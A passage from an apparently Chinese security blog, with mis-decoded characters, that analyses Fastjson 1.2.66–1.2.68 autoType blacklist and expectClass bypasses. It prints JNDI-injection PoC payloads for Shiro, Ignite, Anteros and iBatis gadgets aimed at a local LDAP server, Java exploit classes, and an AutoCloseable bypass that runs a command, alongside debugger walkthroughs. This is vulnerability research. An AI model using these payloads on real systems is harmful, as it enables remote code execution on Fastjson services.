class="string">&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™æ¡é“¾çš„è¿™ä¸ªåŒ…æ²¡æ‰¾åˆ°è¿™ä¸ªç‰ˆæœ¬çš„åˆ©ç”¨å¤±è´¥<br>å„æ¡é“¾çš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.jndi.JndiObjectFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass66</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:1099/Exploit\&quot;],\&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å‡ æ¡é“¾å­éƒ½æ˜¯åˆ©ç”¨çš„jndiæ‰“çš„ï¼Œä¹Ÿæ˜¯æ‹¿ä¸€äº›æ–°çš„ç±»ç»•çš„é»‘åå•</p><h2 id="1-2-67æ¼æ´åˆ†æ"><a href="#1-2-67æ¼æ´åˆ†æ" class="headerlink" title="1.2.67æ¼æ´åˆ†æ"></a>1.2.67æ¼æ´åˆ†æ</h2><p>è¿™ä¸ªä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œä¸è¿‡ç”¨åˆ°åˆ°äº†æ–°çš„ä¸œè¥¿å­¦ä¹ ä¸€ä¸‹</p><h3 id="å‰ææ¡ä»¶-2"><a href="#å‰ææ¡ä»¶-2" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><ul><li>å¼€å¯AutoTypeï¼›</li><li>Fastjson &lt;&#x3D; 1.2.67ï¼›</li><li>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookupç±»éœ€è¦ignite-coreã€ignite-jtaå’Œjtaä¾èµ–ï¼›</li><li>org.apache.shiro.jndi.JndiObjectFactoryç±»éœ€è¦shiro-coreå’Œslf4j-apiä¾èµ–ï¼›</li></ul><h3 id="æ¼æ´åŸç†-1"><a href="#æ¼æ´åŸç†-1" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>æ–°Gadgetç»•è¿‡é»‘åå•é™åˆ¶ã€‚<br>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookupç±»PoCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280023873.png" alt="image-20230828002317395"><br>org.apache.shiro.jndi.JndiObjectFactoryç±»PoCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280023391.png" alt="image-20230828002342936"><br>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass67</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot; \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è°ƒè¯•åˆ†æ-1"><a href="#è°ƒè¯•åˆ†æ-1" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p>çœ‹ä¸€ä¸‹å…³é”®çš„åœ°æ–¹</p><h4 id="org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup"><a href="#org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup" class="headerlink" title="org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"></a>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h4><p>æ ¹æ®PoCï¼š<code>&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;</code>å…ˆè°ƒç”¨jndiNameså±æ€§çš„<code>setter</code>æ–¹æ³•ï¼Œæ³¨æ„è¿™é‡Œæ¥æ”¶å‚æ•°ç±»å‹æ˜¯Listï¼Œå› æ­¤æ„é€ å¯¹åº”çš„å€¼éœ€è¦æ˜¯æ•°ç»„å½¢å¼ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024320.png" alt="image-20230828002401114"><br>ç„¶åæ˜¯è¿™é‡Œçš„<code>getTm()</code>å‡½æ•°ï¼Œå›å¿†ä¸€ä¸‹getterçš„è°ƒç”¨è¦æ»¡è¶³çš„æ¡ä»¶ï¼Œè¿™ä¸ªgetterå¹¶ä¸æ»¡è¶³ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆèƒ½è°ƒç”¨åˆ°å‘¢ï¼Ÿè¿™é‡Œå°±æ¶‰åŠåˆ°äº†Fastjsonå¾ªç¯å¼•ç”¨</p><h4 id="Fastjsonå¾ªç¯å¼•ç”¨"><a href="#Fastjsonå¾ªç¯å¼•ç”¨" class="headerlink" title="Fastjsonå¾ªç¯å¼•ç”¨"></a>Fastjsonå¾ªç¯å¼•ç”¨</h4><p>Fastjsonæ”¯æŒå¾ªç¯å¼•ç”¨ï¼Œå¹¶ä¸”æ˜¯é»˜è®¤æ‰“å¼€çš„ã€‚å‚è€ƒï¼š<a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>åœ¨Fastjsonä¸­ï¼Œå¾€JSONArrayç±»å‹çš„å¯¹è±¡é‡Œé¢addæ•°æ®æ—¶ï¼Œå¦‚æœæ•°æ®ç›¸åŒï¼Œé‚£ä¹ˆå°±ä¼šè¢«æ›¿æ¢æˆ<code>$ref</code>ï¼Œä¹Ÿå°±æ˜¯è¢«ç®€åŒ–äº†ï¼Œå› ä¸ºæ•°æ®ä¸€æ ·æ‰€ä»¥ç›´æ¥æŒ‡å‘ä¸Šä¸€æ¡æ•°æ®ã€‚</p><p><code>$ref</code>å³å¾ªç¯å¼•ç”¨ï¼šå½“ä¸€ä¸ªå¯¹è±¡åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡æ—¶ï¼ŒFastjsonå°±ä¼šæŠŠè¯¥å¯¹è±¡è§£ææˆå¼•ç”¨ã€‚å¼•ç”¨æ˜¯é€šè¿‡<code>$ref</code>æ ‡ç¤ºçš„ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>&#123;&quot;$ref&quot;:&quot;$&quot;&#125;</code></td><td>å¼•ç”¨æ ¹å¯¹è±¡</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;@&quot;&#125;</code></td><td>å¼•ç”¨è‡ªå·±</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;..&quot;&#125;</code></td><td>å¼•ç”¨çˆ¶å¯¹è±¡</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;../..&quot;&#125;</code></td><td>å¼•ç”¨çˆ¶å¯¹è±¡çš„çˆ¶å¯¹è±¡</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;&#125;</code></td><td>åŸºäºè·¯å¾„çš„å¼•ç”¨</td></tr></tbody></table><p>é‚£è¿™æ ·å°±æ¸…æ¥šäº†ï¼Œorg.apache.ignite.cache.jta.jndi.CacheJndiTmLookupç±»PoCä¸­åé¢é‚£æ®µçš„<code>&#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;</code>ï¼Œå®é™…ä¸Šå°±æ˜¯åŸºäºè·¯å¾„çš„å¼•ç”¨ï¼Œç›¸å½“äºæ˜¯è°ƒç”¨<code>root.getTm()</code>å‡½æ•°ï¼Œè¿™ä¸ªrooté€šå¸¸è¡¨ç¤ºæ•´ä¸ª JSON å¯¹è±¡çš„æ ¹ï¼Œè¿›è€Œç›´æ¥è°ƒç”¨äº†tmå­—æ®µçš„<code>getter</code>æ–¹æ³•äº†ã€‚</p><h4 id="org-apache-shiro-jndi-JndiObjectFactory"><a href="#org-apache-shiro-jndi-JndiObjectFactory" class="headerlink" title="org.apache.shiro.jndi.JndiObjectFactory"></a>org.apache.shiro.jndi.JndiObjectFactory</h4><p>æ ¹æ®PoCï¼š<code>&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;</code><br>å…ˆè°ƒç”¨resourceNameå±æ€§çš„<code>setter</code>æ–¹æ³•è®¾ç½®å±æ€§å€¼ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024439.png" alt="image-20230828002421345"><br>å¾€ä¸‹ï¼Œå°±æ˜¯å’Œå‰é¢åŒç†çš„ï¼Œé€šè¿‡<code>&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;</code>å³å¾ªç¯å¼•ç”¨æ¥è°ƒç”¨instanceçš„<code>getter</code>æ–¹æ³•ï¼Œå…¶ä¸­å­˜åœ¨JNDIæ³¨å…¥æ¼æ´ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024820.png" alt="image-20230828002446665"><br>ç„¶åè¿™ä¸ªä¿®å¤ä¹Ÿæ˜¯åŠ é»‘åå•</p><h2 id="1-2-68æ¼æ´åˆ†æï¼ˆexpectClassç»•è¿‡AutoTypeï¼‰"><a href="#1-2-68æ¼æ´åˆ†æï¼ˆexpectClassç»•è¿‡AutoTypeï¼‰" class="headerlink" title="1.2.68æ¼æ´åˆ†æï¼ˆexpectClassç»•è¿‡AutoTypeï¼‰"></a>1.2.68æ¼æ´åˆ†æï¼ˆexpectClassç»•è¿‡AutoTypeï¼‰</h2><h3 id="å‰ææ¡ä»¶-3"><a href="#å‰ææ¡ä»¶-3" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><ul><li>Fastjson &lt;&#x3D; 1.2.68ï¼›</li><li>åˆ©ç”¨ç±»å¿…é¡»æ˜¯expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼›</li></ul><h3 id="æ¼æ´åŸç†-2"><a href="#æ¼æ´åŸç†-2" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>æœ¬æ¬¡ç»•è¿‡<code>checkAutoType()</code>å‡½æ•°çš„å…³é”®ç‚¹åœ¨äºå…¶ç¬¬äºŒä¸ªå‚æ•°expectClassï¼Œå¯ä»¥é€šè¿‡æ„é€ æ¶æ„JSONæ•°æ®ã€ä¼ å…¥æŸä¸ªç±»ä½œä¸ºexpectClasså‚æ•°å†ä¼ å…¥å¦ä¸€ä¸ªexpectClassç±»çš„å­ç±»æˆ–å®ç°ç±»æ¥å®ç°ç»•è¿‡<code>checkAutoType()</code>å‡½æ•°æ‰§è¡Œæ¶æ„æ“ä½œã€‚<br>ç®€å•åœ°è¯´ï¼Œæœ¬æ¬¡ç»•è¿‡<code>checkAutoType()</code>å‡½æ•°çš„æ”»å‡»æ­¥éª¤ä¸ºï¼š</p><ol><li>å…ˆä¼ å…¥æŸä¸ªç±»ï¼Œå…¶åŠ è½½æˆåŠŸåå°†ä½œä¸ºexpectClasså‚æ•°ä¼ å…¥<code>checkAutoType()</code>å‡½æ•°ï¼›</li><li>æŸ¥æ‰¾expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·ä¸€ä¸ªå­ç±»æˆ–å®ç°ç±»å…¶æ„é€ æ–¹æ³•æˆ–<code>setter</code>æ–¹æ³•ä¸­å­˜åœ¨å±é™©æ“ä½œåˆ™å¯ä»¥è¢«æ”»å‡»åˆ©ç”¨ï¼›</li></ol><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç®€å•åœ°éªŒè¯åˆ©ç”¨expectClassç»•è¿‡çš„å¯è¡Œæ€§ï¼Œå…ˆå‡è®¾FastjsonæœåŠ¡ç«¯å­˜åœ¨å¦‚ä¸‹å®ç°AutoCloseableæ¥å£ç±»çš„æ¶æ„ç±»VulAutoCloseableï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;bypass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— éœ€å¼€å¯AutoTypeï¼Œç›´æ¥æˆåŠŸç»•è¿‡<code>CheckAutoType()</code>çš„æ£€æµ‹ä»è€Œè§¦å‘æ‰§è¡Œï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280025028.png" alt="image-20230828002512553"></p><h3 id="è°ƒè¯•åˆ†æ-2"><a href="#è°ƒè¯•åˆ†æ-2" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p>è¿™é‡Œç›´æ¥åœ¨checkAutoTypeå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œçœ‹çœ‹æ€ä¹ˆç»•è¿‡çš„<br>ç¬¬ä¸€æ¬¡æ˜¯ä¼ å…¥java.lang.AutoCloseableç±»è¿›è¡Œæ ¡éªŒï¼Œè¿™é‡Œ<code>CheckAutoType()</code>å‡½æ•°çš„expectClasså‚æ•°æ˜¯ä¸ºnullçš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280025524.png" alt="image-20230828002535960"><br>ç„¶åç»§ç»­å¾€ä¸‹ï¼Œä»ç¼“å­˜ Mapping ä¸­è·å–åˆ°äº† <code>AutoCloseable</code> ç±»èµ‹å€¼ç»™ <code>clazz</code> åå†è¿›è¡Œäº†ä¸€ç³»åˆ—çš„åˆ¤æ–­ï¼Œ<code>clazz</code> æ˜¯å¦ä¸º nullï¼Œä»¥åŠå…³äº internalWhite çš„åˆ¤æ–­ï¼ŒinternalWhite å°±æ˜¯å†…éƒ¨åŠ ç™½çš„åå•ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬è¿™é‡Œè‚¯å®šä¸æ˜¯ï¼Œå†…éƒ¨åŠ ç™½çš„åå•ä¸€å®šæ˜¯éå¸¸å®‰å…¨çš„ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026336.png" alt="image-20230828002602765"><br>ç„¶ååé¢è¿™ä¸ªåˆ¤æ–­é‡Œé¢å‡ºç°äº† <code>expectClass</code>ï¼Œå…ˆåˆ¤æ–­ <code>clazz</code> æ˜¯å¦ä¸æ˜¯ <code>expectClass</code> ç±»çš„ç»§æ‰¿ç±»ä¸”ä¸æ˜¯ <code>HashMap</code> ç±»å‹ï¼Œæ˜¯çš„è¯æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™ç›´æ¥è¿”å›è¯¥ç±»ã€‚<br>æˆ‘ä»¬è¿™é‡Œæ²¡æœ‰ <code>expectClass</code>ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¿”å› <code>AutoCloseable</code> ç±»ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026753.png" alt="image-20230828002621537"><br>æ¥ç€ï¼Œè¿”å›åˆ° <code>DefaultJSONParser</code> ç±»ä¸­è·å–åˆ° <code>clazz</code> åå†ç»§ç»­æ‰§è¡Œï¼Œæ ¹æ® <code>AutoCloseable</code> ç±»è·å–åˆ°ååºåˆ—åŒ–å™¨ä¸º <code>JavaBeanDeserializer</code>ï¼Œç„¶ååº”ç”¨è¯¥ååºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026859.png" alt="image-20230828002641320"><br>ç„¶åè¿›å…¥deserialzeè¿™é‡Œï¼Œè°ƒç”¨çš„æ˜¯ <code>JavaBeanDeserializer</code> çš„ <code>deserialze()</code> æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå…¶ä¸­ type å‚æ•°å°±æ˜¯ä¼ å…¥çš„ <code>AutoCloseableç±»</code>ï¼Œå¦‚å›¾ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026841.png" alt="image-20230828002657296"><br>å¾€ä¸‹çš„é€»è¾‘ï¼Œå°±æ˜¯è§£æè·å– PoC åé¢çš„ç±»çš„è¿‡ç¨‹ã€‚è¿™é‡Œçœ‹åˆ°è·å–ä¸åˆ°å¯¹è±¡ååºåˆ—åŒ–å™¨ä¹‹åï¼Œå°±ä¼šè¿›å»å¦‚å›¾çš„åˆ¤æ–­é€»è¾‘ä¸­ï¼Œè®¾ç½® type å‚æ•°å³ <code>java.lang.AutoCloseable</code> ç±»ä¸º <code>checkAutoType()</code> æ–¹æ³•çš„ expectClass å‚æ•°æ¥è°ƒç”¨ <code>checkAutoType()</code> å‡½æ•°æ¥è·å–æŒ‡å®šç±»å‹ï¼Œç„¶ååœ¨è·å–æŒ‡å®šçš„ååºåˆ—åŒ–å™¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280027403.png" alt="image-20230828002726832"><br>æ­¤æ—¶ï¼Œç¬¬äºŒæ¬¡è¿›å…¥ <code>checkAutoType()</code> å‡½æ•°ï¼ŒtypeName å‚æ•°æ˜¯ PoC ä¸­ç¬¬äºŒä¸ªæŒ‡å®šçš„ç±»ï¼ŒexpectClass å‚æ•°åˆ™æ˜¯ PoC ä¸­ç¬¬ä¸€ä¸ªæŒ‡å®šçš„ç±»<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280027037.png" alt="image-20230828002751466"><br>å¾€ä¸‹ï¼Œç”±äºjava.lang.AutoCloseableç±»å¹¶éå…¶ä¸­é»‘åå•ä¸­çš„ç±»ï¼Œå› æ­¤expectClassFlagè¢«è®¾ç½®ä¸ºtrueï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028627.png" alt="image-20230828002810033"><br>å¾€ä¸‹ï¼Œç”±äºexpectClassFlagä¸ºtrueä¸”ç›®æ ‡ç±»ä¸åœ¨å†…éƒ¨ç™½åå•ä¸­ï¼Œç¨‹åºè¿›å…¥AutoTypeå¼€å¯æ—¶çš„æ£€æµ‹é€»è¾‘<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028295.png" alt="image-20230828002835724"><br>ç”±äºorg.example.VulAutoCloseableç±»ä¸åœ¨é»‘ç™½åå•ä¸­ï¼Œå› æ­¤è¿™æ®µèƒ½é€šè¿‡æ£€æµ‹å¹¶ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚<br>å¾€ä¸‹ï¼ŒæœªåŠ è½½æˆåŠŸç›®æ ‡ç±»ï¼Œå°±ä¼šè¿›å…¥AutoTypeå…³é—­æ—¶çš„æ£€æµ‹é€»è¾‘ï¼Œå’Œä¸ŠåŒç†ï¼Œè¿™æ®µèƒ½é€šè¿‡æ£€æµ‹å¹¶ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028628.png" alt="image-20230828002854090"><br>å¾€ä¸‹ï¼Œç”±äºexpectClassFlagä¸ºtrueï¼Œè¿›å…¥å¦‚ä¸‹çš„<code>loadClass()</code>é€»è¾‘æ¥åŠ è½½ç›®æ ‡ç±»ï¼Œä½†æ˜¯ç”±äºAutoTypeå…³é—­ä¸”jsonTypeä¸ºfalseï¼Œå› æ­¤è°ƒç”¨<code>loadClass()</code>å‡½æ•°çš„æ—¶å€™æ˜¯ä¸å¼€å¯cacheå³ç¼“å­˜çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029096.png" alt="image-20230828002912531"><br>è·Ÿè¿›è¯¥å‡½æ•°ï¼Œä½¿ç”¨AppClassLoaderåŠ è½½org.example.VulAutoCloseableç±»å¹¶ç›´æ¥è¿”å›ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029024.png" alt="image-20230828002929465"><br>å¾€ä¸‹ï¼Œåˆ¤æ–­æ˜¯å¦jsonTypeï¼Œtrueçš„è¯ç›´æ¥æ·»åŠ Mappingç¼“å­˜å¹¶è¿”å›ç±»ï¼Œå¦åˆ™æ¥ç€åˆ¤æ–­è¿”å›çš„ç±»æ˜¯å¦æ˜¯ClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetçš„æœºåˆ¶ï¼š<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029497.png" alt="image-20230828002952920"><br>å‰é¢çš„éƒ½èƒ½é€šè¿‡ï¼Œå¾€ä¸‹ï¼Œå¦‚æœexpectClassä¸ä¸ºnullï¼Œåˆ™åˆ¤æ–­ç›®æ ‡ç±»æ˜¯å¦æ˜¯expectClassç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯å°±æ·»åŠ åˆ°Mappingç¼“å­˜ä¸­å¹¶ç›´æ¥è¿”å›è¯¥ç›®æ ‡ç±»ï¼Œå¦åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼Œ<strong>è¿™é‡Œå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿AutoCloseableæ¥å£ç±»ï¼Œå› 